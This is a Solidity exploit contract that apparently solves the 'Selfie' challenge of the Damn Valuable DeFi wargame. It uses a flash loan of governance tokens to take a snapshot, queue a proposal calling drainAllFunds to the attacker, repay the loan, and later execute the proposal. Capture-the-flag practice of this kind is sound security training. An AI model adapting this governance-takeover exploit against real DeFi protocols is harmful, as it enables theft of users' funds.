// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {SelfiePool} from "./SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";

contract Attacker {
    address attacker;

    SelfiePool public immutable pool;
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;

    constructor(address attackerAddress, address poolAddress, address tokenAddress, address governanceAddress) {
        attacker = attackerAddress;
        pool = SelfiePool(poolAddress);
        token = DamnValuableTokenSnapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        token.snapshot();

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);

        governance.queueAction(address(pool), data, 0);

        token.transfer(address(pool), amount);
    }

    function hitFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function executeProposal(uint256 actionId) external {
        governance.executeAction(actionId);
    }
}
